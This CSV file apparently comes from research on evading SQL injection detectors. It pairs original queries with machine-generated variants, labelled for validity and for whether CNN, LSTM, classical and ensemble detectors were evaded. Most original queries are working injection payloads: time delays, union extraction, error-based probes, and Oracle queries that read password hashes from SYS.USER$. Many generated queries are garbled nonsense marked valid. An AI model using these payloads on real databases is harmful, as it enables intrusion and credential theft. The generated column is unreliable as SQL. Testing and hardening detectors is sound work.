original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
1 where 7038  =  7038,"SELECT * FROM query: 1 WHERE 7038 = 7038 AND NOT SQL_Injection = ""valid""",1,0,1,0,0,0,0
"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ynwr"" like ""ynwr","SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(1,5000000) FROM generate_series) AND (SELECT MIN(*) FROM generate_series) AND (SELECT MIN(*) FROM SELECT MIN(*) FROM SELECT MIN(SQL) FROM generate_series)",1,1,0,0,1,0,0
' select * from information_schema.tables--,SELECT MIN(sql injection) FROM SQL Query: 'yes',1,0,1,1,1,1,1
1   )    )    as dgso where 4654  =  4654 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,SELECT MIN(sequence) FROM SQL injection JOIN (SELECT SUM(SQL) FROM SQL) AS :_text||chr ( 112 ) ||chr ( 112 ) AND NOT :_text||chr ( 2853 = 4654),0,1,0,0,0,0,0
1'  )   and 4822  =  6997 and   (  'ojku'  =  'ojku,SELECT MIN('sql injection') FROM SQL injection detection,1,0,1,1,1,1,1
"1""   )    )    as xcyo where 2929  =  2929",SELECT MIN(2929 = 2929) FROM SQL injection detection,1,1,0,1,1,1,0
"1  )   where 8302  =  8302 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",SELECT * FROM SQL AS _valid_message WHERE 8302 = 8302 OR 8302 = 8302 OR 2633 = dbms_pipe.receive_message (chr ( 112 ) ||chr ( 65 ),1,1,0,0,0,0,0
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1","SELECT NOT SQL,version ( ) FROM null,version ( ) FROM users WHERE NOT id = 1 OR 1# = 1",1,1,1,0,0,0,0
1  )   as vqbf where 4020  =  4020,SELECT NOT vqbf FROM query: 1 - SELECT generated FROM query: 1 - SELECT generated FROM Query: 1 - SELECT generated FROM SQL query: 1 - SELECT generated FROM Query: 1 - vqbf WHERE 4020 = 4020 = 4020,1,1,1,1,1,1,1
select   (  case when   (  4306  =  2815  )   then 4306 else 1/  (  select 0  )   end  )  --,SELECT MIN(SELECT 0 FROM SQL SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
"1'||  (  select 'jonh' from dual where 2415  =  2415 union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection detection',1,0,1,1,1,1,1
select   (  case when   (  1354  =  7529  )   then 1354 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,SELECT MIN(sequence) FROM SQL injection detection,1,0,1,1,1,1,1
"-4385%'   )    )    union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT 6694,6694,6694,6694,6694 = 6694,6694#",1,1,1,1,0,1,0
-6529'  )   or   (  4309  =  1601  )  *1601,SELECT MIN(4309 = 1601) FROM SQL injection AS _evade_susc injection_detecting,1,0,0,1,1,1,0
"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""%""  =  """,SELECT DISTINCT ((((((((((((((((()) FROM SQL injection)) FROM SQL injection),1,1,0,0,0,0,0
select   (  case when   (  3855  =  3855  )   then 3855 else 1/  (  select 0  )   end  )  --,"SELECT 0 FROM SQL injection detection WHERE NOT case = ""SQL injection detection""",0,0,1,1,1,1,1
"1""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL injection detection WHERE NOT all_users = 1,1,0,0,0,1,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.USER$ WHERE NOT SELECT SELECT MIN(SELECT) FROM SELECT SELECT SELECT MIN(SELECT) FROM SELECT SELECT MIN(SELECT) FROM SYS.USER$),0,1,1,1,1,1,1
"1   )    )    as wufr where 5239  =  5239 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT MIN(*) FROM SQL injection detection WHERE ""5239 = 5239"" OR domain.domain.tables = ""t2, domain.tables as t3 )""",0,1,0,0,0,0,0
"1'+  (  select 'xqpe' where 4020  =  4020 union all select null,null--",SELECT 'xqpe' FROM SQL injection',1,0,1,1,1,1,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,SELECT DISTINCT vwyq FROM SQL injection,1,0,1,1,1,1,1
1  )   as zmxb where 8424  =  8424 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,SELECT MIN(sequence) FROM SQL injection JOIN zmxb' AND 8424 = 8424 AND 2853 = cast ( (chr ( 113 ) ||chr ( 112 ),0,1,0,0,0,0,0
1%'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',SELECT MIN(SQL) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) AND ((SQL_CHr ( 4386 = 4386 ='sql injection'),1,1,0,0,1,0,0
"1%'   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql ) FROM SQL injection,1,0,1,1,1,1,1
"1%""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""%""  =  ""","SELECT MIN(4249 = 4249 = 4249 = 7259 / (SELECT SUM(%) FROM SQL injection) FROM SQL SELECT MIN((%) FROM SQL injection) FROM elt WHERE NOT elt = 4249 = 4249 = 4249 = 4249 = 4249 = 4249 = 7259 ) AND (((%) = ""sql injection detection""",1,1,0,0,0,0,0
"-8040""   )    )     )   or make_set  (  3916  =  6787,6787  )   and    (    (     (  ""laar"" like ""laar",SELECT DISTINCT ((((((((((()) FROM SQL injection) ORDER BY COUNT(*) DESC LIMIT 1),1,1,0,0,0,0,0
1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,SELECT MIN(sqt) FROM SQL injection detection,1,0,1,1,1,1,1
"1'||  (  select 'txyy' where 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'","SELECT txyy FROM SQL JOIN (SELECT txyy, MIN(sql) FROM SQL JOIN Query: 1'||) AS t2 ON t1.excat = t2.excat_0, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c,'sq injection') ='sql injection')",0,1,0,0,0,0,0
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""pnub""  =  ""pnub","SELECT MIN(sequence) FROM SQL injection, SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM SQL",1,1,1,1,1,1,1
"1"" where 9792  =  9792 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
"-9774'   )    )     )   union all select 6954,6954,6954#","SELECT 6954,6954# FROM SQL injection AS :SELECT MIN(sql injection) FROM SELECT 6954,6954# FROM SQL SELECT MIN(sql injection) FROM Query: -9774' )",1,1,1,0,1,1,0
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT crypt_key = 'evade',1,0,1,1,1,1,1
1  )   and 9198  =  9198--,SELECT * FROM query: 1 INTERSECT SELECT * FROM query: 9198-- SELECT * FROM query: 9198--,1,1,1,1,1,1,1
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'ulkq'  =  'ulkq,SELECT MIN(SQQ) FROM SQL injection detection) AND 3754 = 3754,1,1,0,0,1,0,0
')))) waitfor delay '0:0:20' --,SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --","SELECT MIN(5000000, md5 ( 0x694a4745 ) FROM SQL injection AS _evade_susc injection_description) FROM SQL WHERE 8781 = 8781 OR 8781 = 8781 OR 8466 = benchmark (5000000,md5 ( 0x694a4745 )",1,1,0,0,0,0,0
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--","SELECT MIN(USER()) FROM SQL, SELECT SELECT FROM @@VERSION,USER(), SELECT FROM SQL,SELECT SUM(USER()) FROM SQL JOIN SELECT SELECT FROM SQL JOIN SELECT SELECT FROM FROM SELECT SELECT SELECT SELECT SELECT 'SQL injection' FROM SQL",0,1,1,0,1,1,0
"UNION ALL SELECT 1,2,3,4--","SELECT MIN(SQL) FROM SQL SELECT MIN(1,2,3,4-- SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL",1,1,1,0,0,0,0
 (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1931  =  1931  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,"SELECT DISTINCT esq_injection FROM SQL SELECT esq_injection_detection, COUNT(*) FROM SQL INNER JOIN Query: (SELECT esq_injection_detection_detection_detection) FROM SQL INNER JOIN (SELECT esq_injection_detection_detection_detection_detection_detection_detection_detect) +char ( +char ( 113 ) FROM SQL SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL SELECT, COUNT(*) FROM Query: 'SQ') +char ( +char ( +char ( +char ( +char ( +char ( 113 ) +char (SELECT esq_injection_detection_detection_detection_detection_detection_detect) FROM SQL SELECT esq_injection_detect_detect_detect_de",1,0,0,0,1,0,0
"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,0,0,0
1'||  (  select 'vvpn' from dual where 7011  =  7011 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',SELECT MIN(sqlid_to_sqlhash) FROM SQL injection JOIN 1'|| (SELECT SUM(sqlid_to_sqlhash) FROM sqlid_to_sqlhash) FROM sqlid_to_sqlhash) FROM sqlid_to_sqlhash WHERE 7011 = 7011 AND 7756 = 7756 = dbms_utility.sqlid_to_sqlhash ((SELECT SUM(sqlid_to_sqlid_to_sqlhash) FROM dbms_utility.sqlid_to_sqlhash),0,1,0,0,0,0,0
"1'||  (  select 'votg' where 5105  =  5105 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",SELECT MIN(*) FROM SQL_injection),1,0,0,0,1,0,0
"1%' and elt  (  4249  =  4249,7259  )   and '%'  =  '",SELECT MIN(4249 = 4249 = 4249 = 7259 ) FROM SQL injection detection,1,1,0,0,0,0,0
"-3729'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'czed'  =  'czed",SELECT MIN(5023 ='sql injection') FROM SQL -3729' ORDER BY MIN(5023 = ctxsys.drithsx.sn (5023 = 'ctxsys.drithsx.sn (5023 = 'ctxsys.drithsx.sn (5023 = 'ctxsys.drithsx.sn (5023 = 113 ) ORDER BY _czed),1,1,0,0,0,0,0
or 1  =  1 or ''  =  ',SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
ORDER BY 4--,"SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT FROM FROM 4-- ORDER BY NOT SQL_inject FROM query: ORDER BY 4-- ORDER BY ""valid"" FROM query: ORDER BY 4-- ORDER BY 4-- SELECT query: SELECT query: MIN(written) FROM query: ORDER BY 4-0",1,0,1,1,1,1,1
"-2071 union all select 4753,4753--","SELECT MIN(SQL) FROM SQL - MIN(SQL) FROM Query: -2071 union All select 4753,4753--",1,1,1,1,0,1,0
26%,SELECT NOT SQL_inject FROM query: 26%,1,0,0,1,1,1,0
1'   )    )    and sleep  (  5  )  #,SELECT MIN(5 ) FROM SQL injection detection,1,1,1,1,1,1,1
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
1'||  (  select 'gmkp' where 6016  =  6016,SELECT'sql injection' FROM SQL SELECT MIN(6016 = 6016) FROM SQL SELECT SELECT 'gmkp' FROM query: 1'|| (SELECT 'gmkp' FROM SQL injection'),1,1,0,0,1,0,0
"1',  (  case when 3598  =  2118 then 1 else null end  )  ","SELECT MIN(case) FROM SQL injection detection WHERE ""SQL injection detection"" = 'evade sq injection'",0,0,1,1,1,1,1
"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #","SELECT MIN(short) FROM SQL injection_detect WHERE 4940 = 4940 OR 5873 = 5873,sleep ( 5 )",1,1,0,0,0,0,0
-7532   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8332  =  8332,SELECT MIN(sql injection) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) ORDER BY 8332,0,1,1,1,1,1,1
SELECT COUNT(*) FROM game;,SELECT query: SELECT COUNT(*) FROM game;sql injection ='sq injection' AND NOT SELECT FROM query: SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
"UNION ALL SELECT 1,2,3",SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
-1796'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'lpuw' like 'lpuw,SELECT MIN(sql injection) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) ORDER BY _chr ( 113 ),1,1,1,0,1,1,0
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#","SELECT, COUNT(*) FROM SQL_injection WHERE NOT SELECT 'INJ'||'XXX'",1,0,1,0,1,1,0
1'||  (  select 'ifts' from dual where 6329  =  6329,SELECT 'ifts' FROM SQL injection detection',1,0,1,1,1,1,1
"1  )   as zhvx where 3171  =  3171 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --","SELECT MIN(extractionvalue) FROM SQL, SELECT MIN(extractionvalue) FROM zhvx WHERE NOT zhvx = 3171 = 3171 AND NOT 0x7171706a71 = 1",1,1,0,0,1,0,0
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'mnod'  =  'mnod",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"-9656"" union all select 8735,8735--","SELECT 8735,8735-- FROM SQL injection_description WHERE NOT SELECT 8735,8735-- FROM SQL_Injection_Query: -9656 union All select 8735,8735-- FROM SQL_Injection_Required = 8735,8735--",1,1,1,1,0,1,0
"1   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  9255  =  9255","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 - or ((*) FROM SQL_injection) ORDER BY (SELECT * FROM SQL_injection)",0,1,0,0,0,0,0
"1%'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT MIN(*) FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7""",1,1,0,0,0,0,0
1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,SELECT MIN(sequence) FROM SQL injection detection WHERE NOT SELECT MIN(sql injection) FROM query: 1' AND 8594 = (SELECT MIN(selection) FROM pg_sleep ( 5 ),1,1,0,0,1,0,0
-8836%'  )   or 4856  =  3891,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM Query: -8836%' OR 4856 = 3891,1,1,0,0,1,0,0
"1"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""snht""  =  ""snht","SELECT COUNT(*) FROM SQL injection, SELECT MIN(*) FROM SQL_injection) FROM sysusers WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 & ""snht"" = ""snht""",1,1,0,0,0,0,0
"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474","SELECT MIN(1808,concat) FROM SQL_injection, COUNT(*) FROM SQL_injection, MIN(1808 = 9474) AND NOT (SELECT MIN(1808 = 9474) FROM SQL_injection)",1,1,0,0,1,0,0
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*","SELECT (SELECT NULL, NULL) FROM query: +if(dull) FROM query: +if(dull) - if(dull) FROM SQL, SELECT NULL FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(sql) ='sq injection') - SELECT NULL, NULL FROM query: +if(dull) FROM SELECT NULL, NULL FROM SELECT NULL, NULL FROM query: +if(dull) FROM query: +if(dull) FROM SELECT NULL, NULL FROM query: +if(dull) FROM Query: +if(dull) FROM SELECT NULL, NULL, NULL, NULL) FROM SELECT NULL, NULL FROM query: +if(dull) FROM query: +if(dull) FROM query:",1,1,0,0,1,0,0
"1%""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
1%'   )    )    union all select null#,SELECT DISTINCT null# FROM SQL injection,1,0,1,1,0,1,0
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ","SELECT MIN(7982,concat) FROM SQL_injection WHERE NOT elt (0x7171706a71 )",1,1,0,0,1,0,0
1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',SELECT 'oxas' FROM SQL injection',1,0,1,1,1,1,1
ORDER BY 8#,"SELECT * FROM query: SELECT query: SELECT query: SELECT query_from FROM 8# WHERE NOT SQL_inject = ""valid"" AND NOT query_ordered = ""yes""",1,0,1,1,1,1,1
INSERT INTO table,"SELECT MIN(sql) FROM table_name WHERE NOT SELECT MIN(sql) FROM table_name = ""sq injection""",1,0,1,0,1,1,0
1'  )   as syer where 3141  =  3141 rlike   (  select   (  case when   (  6233  =  7567  )   then 1 else 0x28 end   )    )   --,SELECT MIN(1 AS _x28_end) FROM SQL injections WHERE NOT SELECT MIN(syst_injection) FROM SQL_injection),1,1,1,1,1,1,1
1'||  (  select 'pxkz' where 2207  =  2207 and   (  3020  =  3020  )  *6703  )  ||',SELECT DISTINCT pxkz FROM SQL JOIN 2207 = 2207 AND 3020 = 3020,0,1,1,1,0,1,0
' union all select @@version--,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i","SELECT MIN(SELECT) FROM SYS.USER$, COUNT(*) FROM (SELECT SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT MIN(SELECT) FROM SYS.USER$)",0,1,0,1,1,1,0
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--","SELECT (SELECT MAX(3000000,MD5(1)) FROM SQL AS t1 JOIN Query: ""+if(benchmark(3000000,MD5(1))"" FROM query: ""+if(benchmark(3000000,MD5(1))"" AND NOT SQL_injection = ""SQL""",0,1,0,0,1,0,0
"1%""  )   rlike   (  select   (  case when   (  7736  =  7642  )   then 1 else 0x28 end   )    )    and   (  ""%""  =  """,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"-2028%'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  '",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
"-9751""   )    )     )   or 5929  =  3884--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -9751 - 5929 = 3884--,1,1,1,1,1,1,1
"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  ""","SELECT MIN(""%"") FROM SQL injection detection",1,0,0,0,1,0,0
"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu","SELECT MIN(sdvu) FROM SQL injection, SELECT MIN(sdvu) FROM SQL - SELECT MIN(sdvu) FROM SQL",1,1,0,1,1,1,0
"1'+  (  select sfuq where 8094  =  8094 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'","SELECT sfuq FROM SQL, SELECT 0x5c, MIN(extractionvalue) FROM SQL, SELECT sfuq FROM sq WHERE 8094 = 8094 AND procedure = 'exsq injection'",1,1,1,0,1,1,0
"1   )    )    as jyfo where 8121  =  8121 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",SELECT MIN(selection_number) FROM SQL injection WHERE esq = 'exs' AND NOT idb$types = '881 = 8121' AND 9254 = (SELECT MIN(selection_number) FROM SQL injection'),1,1,0,0,1,0,0
"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--","SELECT DISTINCT euclas FROM SQL injection_detective WHERE NOT benchmark(3000000,MD5(1)) = 1",1,1,0,0,1,0,0
"1%'  )   union all select null,null,null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
